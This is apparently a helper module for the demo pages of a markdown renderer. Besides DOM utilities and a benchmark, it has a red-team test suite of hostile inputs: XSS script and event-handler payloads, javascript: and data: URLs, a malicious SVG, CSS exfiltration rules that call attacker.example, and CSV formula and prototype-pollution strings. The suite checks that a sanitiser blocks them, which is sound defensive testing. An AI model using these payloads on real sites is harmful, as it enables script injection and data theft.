/**
 * Shared helpers, styles, sandbox handlers and live security checks for all
 * markdown2.js showcase pages. Strict CSP: no inline script, eval, or styles.
 */
import {
  core,
  defaultConsent,
  defaultCss,
  defineElement,
  encryptAge,
  gzipBase64,
  installFrameHost,
  Marked,
  marked,
  mount,
  REQUIRES_ASYNC,
  resource,
  sandboxHandlers,
  version,
} from './markdown2.js';

export {
  core,
  defaultConsent,
  defaultCss,
  defineElement,
  encryptAge,
  gzipBase64,
  installFrameHost,
  Marked,
  marked,
  mount,
  REQUIRES_ASYNC,
  resource,
  sandboxHandlers,
  version,
};

export const PASS = 'markdown2';
export const WORK_FACTOR = 12;

export const allHandlers = sandboxHandlers();

// Apply default look in the m2-ua cascade layer so page styles win.
const baseSheet = new CSSStyleSheet();
baseSheet.replaceSync(defaultCss);
document.adoptedStyleSheets = [...document.adoptedStyleSheets, baseSheet];

export function $(id) {
  const e = document.getElementById(id);
  if (!e) throw new Error(`#${id} missing`);
  return e;
}

export function h(tag, props = {}, ...kids) {
  const e = document.createElement(tag);
  Object.assign(e, props);
  e.append(...kids);
  return e;
}

export function showError(e) {
  const b = document.getElementById('error');
  const msg = `The example could not run: ${e instanceof Error ? e.message : String(e)}`;
  if (b) {
    b.textContent = b.hidden ? msg : `${b.textContent}\n${msg}`;
    b.hidden = false;
  }
  console.error(e);
}

export function run(fn) {
  return Promise.resolve().then(fn).catch(showError);
}

export function showDiagnostics(ul, diags) {
  ul.replaceChildren(
    ...(diags.length === 0
      ? [h('li', { className: 'muted', textContent: 'No diagnostics.' })]
      : diags.map((d) =>
          h('li', {
            textContent: `line ${d.line + 1}${d.nodeId ? ` [${d.nodeId}]` : ''}: ${d.code}: ${d.message}`,
          }),
        )),
  );
}

export function debounce(fn, wait) {
  let t;
  return (...args) => {
    clearTimeout(t);
    t = setTimeout(() => fn(...args), wait);
  };
}

export const ms = (x) => (x < 10 ? `${x.toFixed(2)} ms` : `${Math.round(x).toLocaleString()} ms`);
export const utf8 = new TextEncoder();
export const decode = (bytes) => new TextDecoder().decode(bytes);
export const esc = (s) => core.escapeHtml(String(s));

export function fmtBytes(n) {
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / (1024 * 1024)).toFixed(2)} MB`;
}

export function toBase64(text) {
  const bytes = utf8.encode(text);
  let s = '';
  for (let i = 0; i < bytes.length; i += 0x8000) s += String.fromCharCode(...bytes.subarray(i, i + 0x8000));
  return btoa(s).replace(/.{76}/g, '$&\n').trim();
}

export function safeToken(base, payload) {
  let clean = String(base || 'DATA')
    .toUpperCase()
    .replace(/[^A-Z0-9_]/g, '');
  if (!/^[A-Z]/.test(clean)) clean = `R${clean}`;
  const lines = new Set(payload.split(/\r?\n/).map((l) => l.replace(/[ \t]+$/, '')));
  let token = clean;
  let n = 1;
  while (lines.has(token)) token = `${clean}${++n}`;
  return { token, base: clean, collisions: n - 1 };
}

export function parseToFragment(html) {
  const tpl = document.createElement('template');
  tpl.innerHTML = html;
  return tpl.content;
}

/** Populate version badge and mark the active sub-page in navigation. */
export function initChrome() {
  const ver = document.getElementById('version');
  if (ver) ver.textContent = `v${version}`;
  const file = location.pathname.split('/').pop() || 'index.html';
  for (const a of document.querySelectorAll('.toc a[href]')) {
    const href = a.getAttribute('href') || '';
    const target = href.replace(/^\.\//, '').split('#')[0];
    if (target === file || (file === '' && target === 'index.html')) {
      a.setAttribute('aria-current', 'page');
    }
  }
}

/**
 * Wire up a standard live-editable demo pair (source textarea + mount() view)
 * with all rich sandbox handlers enabled.
 */
export async function mountEditableDemo({ editorId, viewId, resetId, timeId, source, allowOrigins = [] }) {
  const editor = $(editorId);
  const viewEl = $(viewId);
  const timeEl = timeId ? document.getElementById(timeId) : null;
  let initial = source;
  editor.value = initial;

  const view = mount(viewEl, initial, {
    baseUrl: location.href,
    handlers: allHandlers,
    allowOrigins,
    consent: defaultConsent,
  });
  await view.ready;

  let seq = 0;
  const apply = async (src) => {
    const mine = ++seq;
    const t0 = performance.now();
    await view.update(src);
    if (mine !== seq) return;
    if (timeEl) timeEl.textContent = `Rendered in ${ms(performance.now() - t0)}`;
  };

  editor.addEventListener(
    'input',
    debounce(() => {
      void apply(editor.value);
    }, 250),
  );

  if (resetId) {
    $(resetId).addEventListener('click', () => {
      editor.value = initial;
      void apply(initial);
    });
  }

  return {
    view,
    setSource: async (next) => {
      initial = next;
      editor.value = next;
      await apply(next);
    },
  };
}

// ================================================================ shared red-team suite

const ACTIVE_SELECTOR = 'script, iframe, frame, frameset, object, embed, applet, base, meta, link, form, portal';
const BAD_URL = /^(javascript|vbscript|data:text\/html|data:application\/xhtml)/;

const noActiveElements = (root) => root.querySelectorAll(ACTIVE_SELECTOR).length === 0;
function noHandlers(root) {
  for (const el of root.querySelectorAll('*')) for (const a of el.attributes) if (/^on/i.test(a.name)) return false;
  return true;
}
function safeUrls(root) {
  for (const el of root.querySelectorAll('*')) {
    for (const a of el.attributes) {
      const name = a.name.toLowerCase();
      if (name === 'srcdoc') return false;
      if (!/(href|src|action|formaction|data|poster)$/.test(name)) continue;
      // eslint-disable-next-line no-control-regex
      const v = a.value.replace(/[\u0000-\u0020]/g, '').toLowerCase();
      if (BAD_URL.test(v)) return false;
    }
  }
  return true;
}
function nothingRemote(root) {
  for (const el of root.querySelectorAll('[src], [srcset], [poster], [background]')) {
    for (const name of ['src', 'srcset', 'poster', 'background']) {
      const v = el.getAttribute(name);
      if (v && /(^|\s|,)(https?:)?\/\//i.test(v)) return false;
    }
  }
  return true;
}
const absent = (needle) => (root) => !root.textContent.includes(needle);

const STD = [
  ['No script, frame, object or form elements', noActiveElements],
  ['No event-handler attributes', noHandlers],
  ['No javascript:, vbscript: or data:text/html URLs', safeUrls],
];

const SEALED_SECRET = 'Rendezvous at dawn, pier nine';

export const ATTACKS = [
  {
    title: 'Script in the prose',
    threat: 'Raw HTML, comments, tables and a tracking pixel, all trying to run or phone home.',
    src: `# Hello <script>alert('prose')</script>

An image with a handler: <img src=x onerror="alert('img')">

<iframe src="https://attacker.example/"></iframe>

<!-- --><script>alert('comment')</script>

A tracking pixel in image syntax: ![pixel](https://attacker.example/pixel.png?who=you)

| cell | <svg onload="alert('table')"> |
| ---- | ---- |
| <a href="javascript:alert(1)">x</a> | ok |
`,
    checks: [...STD, ['No remote image loads, not even the pixel', nothingRemote]],
  },
  {
    title: 'Dangerous links',
    threat: 'Every way to spell javascript: that a sanitiser might miss, and one honest link.',
    src: `- [plain](javascript:alert(1))
- [mixed case](JaVaScRiPt:alert(1))
- [tab inside](java\tscript:alert(1))
- [entity colon](javascript&#58;alert(1))
- [data page](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
- [vbscript](vbscript:msgbox(1))
- <javascript:alert(1)>
- [an honest link](https://commonmark.org)
`,
    checks: [
      ...STD,
      ['The honest link survives', (root) => root.querySelector('a[href^="https://commonmark.org"]') !== null],
    ],
  },
  {
    title: 'An SVG with ideas',
    threat: 'onload, an inline script, a javascript: link and a foreignObject iframe, all in one image.',
    src: `<<<BADGE type="image/svg+xml" title="A hostile SVG"
<svg xmlns="http://www.w3.org/2000/svg" width="120" height="60" onload="alert('onload')"><script>alert('script')</script><a href="javascript:alert('link')"><rect width="120" height="60" rx="10" fill="#b4441c"/></a><foreignObject width="120" height="60"><iframe xmlns="http://www.w3.org/1999/xhtml" src="https://attacker.example/"></iframe></foreignObject></svg>
BADGE
`,
    checks: [
      ...STD,
      ['Drawn through <img>, not inlined', (root) => root.querySelector('img') !== null && root.querySelector('svg script, svg foreignObject') === null],
    ],
  },
  {
    title: 'Attribute injection',
    threat: 'A title and filename that try to close the tag they are written into, and an event handler as an attribute.',
    src: `<<<NAME type="text/plain" title='"><img src=x onerror=alert(1)>' filename='"><script>alert(2)</script>.txt' onmouseover="alert(3)"
The attributes above try to break out of the markup they end up in.
NAME
`,
    checks: STD,
  },
  {
    title: 'Payload leaks',
    threat: 'Four broken resources, each carrying a canary. If a canary reaches the page, the payload leaked.',
    src: `<<<NOTYPE title="No type"
CANARY-NOTYPE-7f3a
NOTYPE

<<<NOPE type="application/x-unknown-format" title="Unknown type"
CANARY-UNKNOWN-91bc
NOPE

<<<BADB64 type="text/plain" encoding="base64" title="Broken base64"
!!! CANARY-B64-55de !!!
BADB64

<<<BADJSON type="application/json" title="Invalid JSON"
{"secret": "CANARY-JSON-c0ff",
BADJSON
`,
    checks: [
      ['Missing type: payload withheld', absent('CANARY-NOTYPE-7f3a')],
      ['Unknown type: payload withheld', absent('CANARY-UNKNOWN-91bc')],
      ['Broken base64: payload withheld', absent('CANARY-B64-55de')],
      ['Invalid JSON: payload withheld', absent('CANARY-JSON-c0ff')],
    ],
  },
  {
    title: 'Terminator tricks',
    threat: 'Near-miss terminators, an injected heading and a fake nested resource carrying a script.',
    src: `<<<BOX type="text/plain" title="A payload that impersonates its surroundings"
BOX only ends the block on a line of its own; BOXES and box are text.
BOXES
box
## Injected heading
<<<FAKE type="text/html"
<script>alert('nested')</script>
FAKE
BOX

This sentence comes after the resource.
`,
    checks: [
      ...STD,
      ['The injected heading stays text', (root) => [...root.querySelectorAll('h1,h2,h3,h4,h5,h6')].every((x) => !x.textContent.includes('Injected heading'))],
      ['The resource ends at the right line', (root) => [...root.querySelectorAll('p')].some((p) => p.textContent.includes('This sentence comes after'))],
    ],
  },
  {
    title: 'Locked stays locked',
    threat: 'An encrypted section, a remote image and a page to frame, rendered with async: true, the full pipeline.',
    async: true,
    src: async () => {
      const ct = await encryptAge(SEALED_SECRET, 'correct horse battery staple', { workFactor: WORK_FACTOR });
      return `<<<SEALED type="text/markdown" encoding="base64 age" title="Sealed orders"
${ct}
SEALED

<<<BEACON type="image/svg+xml" encoding="uri" title="A remote beacon"
https://attacker.example/beacon.svg
BEACON

<<<FRAME type="text/uri-list" title="A page that wants a frame"
https://attacker.example/
FRAME
`;
    },
    checks: [
      ...STD,
      ['The plaintext never appears', absent(SEALED_SECRET)],
      ['The sealed card still shows its title', (root) => root.textContent.includes('Sealed orders') || root.querySelector('[title="Sealed orders"]') !== null],
      ['Nothing remote is loaded or framed', nothingRemote],
    ],
  },
  {
    title: 'CSS exfiltration',
    threat: '@import, background images, attribute-selector leaks and a remote font, all aimed at attacker.example.',
    src: `<<<EXFIL type="text/css" rel="stylesheet"
@import url(https://attacker.example/steal.css);
md2-document { background: url(https://attacker.example/seen.png); }
input[value^="a"] { background-image: url("https://attacker.example/?a"); }
@font-face { font-family: x; src: url(https://attacker.example/font.woff); }
EXFIL

This document tries to phone home through its styles.
`,
    checks: [
      ...STD,
      [
        'No live style mentions attacker.example',
        (root) =>
          [...root.querySelectorAll('style')].every((s) => !s.textContent.includes('attacker.example')) &&
          [...root.querySelectorAll('[style]')].every((el) => !el.getAttribute('style').includes('attacker.example')),
      ],
    ],
  },
  {
    title: 'Hostile data',
    threat: 'Markup and spreadsheet formulas inside CSV cells, and a script-closing string inside JSON.',
    src: `<<<CELLS type="text/csv" title="A poisoned spreadsheet"
Name,Comment
<img src=x onerror=alert(1)>,"=HYPERLINK(""javascript:alert(2)"",""click"")"
<script>alert(3)</script>,ok
CELLS

<<<RECORD type="application/json" title="A poisoned record"
{"name": "</script><script>alert(4)</script>", "__proto__": {"polluted": true}}
RECORD
`,
    checks: [...STD, ['Object.prototype is not polluted', () => !({}).polluted]],
  },
];

export async function runRedTeamSuite() {
  let passed = 0;
  let total = 0;
  const items = [];
  for (const [i, a] of ATTACKS.entries()) {
    try {
      const src = typeof a.src === 'function' ? await a.src() : a.src;
      const opts = { idPrefix: `rt${i}-` };
      const html = a.async ? await marked.parse(src, { ...opts, async: true }) : marked.parse(src, opts);
      const frag = parseToFragment(html);
      const results = a.checks.map(([label, test]) => {
        let ok = false;
        try {
          ok = Boolean(test(frag, html));
        } catch {
          ok = false;
        }
        return [label, ok];
      });
      const good = results.filter(([, ok]) => ok).length;
      passed += good;
      total += results.length;
      items.push({ attack: a, src, html, results, good });
    } catch (e) {
      total += 1;
      items.push({ attack: a, error: e });
    }
  }
  return { passed, total, items };
}

export function stressSource(n) {
  const parts = ['# Stress test', ''];
  for (let i = 0; i < n; i++) {
    parts.push(
      `## Section ${i + 1}`,
      '',
      `Paragraph ${i} with **bold**, *emphasis*, \`code\` and [a link](https://commonmark.org/#${i}).`,
      '',
      resource({ type: 'application/json', token: `J${i}`, title: `Record ${i}`, payload: JSON.stringify({ i, ok: i % 7 !== 0, tags: ['alpha', 'beta'], score: (i * 37) % 101 }) }),
      '',
      resource({ type: 'text/plain', encoding: 'base64', token: `B${i}`, payload: btoa(`row ${i}: hello from base64`) }),
      '',
      resource({ type: 'text/csv', token: `C${i}`, title: `Table ${i}`, payload: `k,v\na,${i}\nb,${i * 2}` }),
      '',
    );
  }
  return parts.join('\n');
}

export function benchParse(n, runs = 3) {
  const src = stressSource(n);
  marked.parse(src, { idPrefix: 'warm-' });
  const times = [];
  let html = '';
  for (let r = 0; r < runs; r++) {
    const t0 = performance.now();
    html = marked.parse(src, { idPrefix: `b${r}-` });
    times.push(performance.now() - t0);
  }
  times.sort((a, b) => a - b);
  return {
    n,
    resources: n * 3,
    srcBytes: utf8.encode(src).length,
    htmlBytes: utf8.encode(html).length,
    median: times[Math.floor(times.length / 2)],
  };
}
